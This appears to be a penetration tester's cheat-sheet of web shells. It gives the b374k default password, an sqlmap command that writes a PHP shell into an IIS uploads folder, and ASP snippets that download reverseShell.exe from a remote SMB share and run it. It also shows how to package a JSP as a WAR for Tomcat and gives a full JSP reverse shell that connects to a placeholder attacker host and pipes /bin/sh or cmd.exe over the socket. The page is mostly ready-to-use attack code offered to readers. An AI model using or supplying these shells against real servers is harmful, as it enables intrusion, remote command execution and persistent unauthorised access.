These web shells helped tons. They might help you as well.

### [b374k webshell password]
```
b374k
```

### [Uploading Webshell using sqlmap]
```
sqlmap -r file_request --file-write=/root/pwn/http/winterwolfshell.php --file-dest=/inetpub/wwwroot/uploads/winterwolfshell.php --batch
```

### [asp based webshell]
```
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /C mkdir C:\test",0,True)
%>

<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /C copy \\<ip>\share\reverseShell.exe C:\test\reverseShell.exe",0,True)
%>

<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /C start C:\test\reverseShell.exe",0,True)
%>
```

### [jsp shell to war - tomcat]

converting  jsp to war
`jar -cvf webshell.war index.jsp`

### index.jsp
```
<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream lq;
    OutputStream sz;

    StreamConnector( InputStream lq, OutputStream sz )
    {
      this.lq = lq;
      this.sz = sz;
    }

    public void run()
    {
      BufferedReader gf  = null;
      BufferedWriter ybi = null;
      try
      {
        gf  = new BufferedReader( new InputStreamReader( this.lq ) );
        ybi = new BufferedWriter( new OutputStreamWriter( this.sz ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = gf.read( buffer, 0, buffer.length ) ) > 0 )
        {
          ybi.write( buffer, 0, length );
          ybi.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( gf != null )
          gf.close();
        if( ybi != null )
          ybi.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "<LHOST>", <LPORT> );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
```
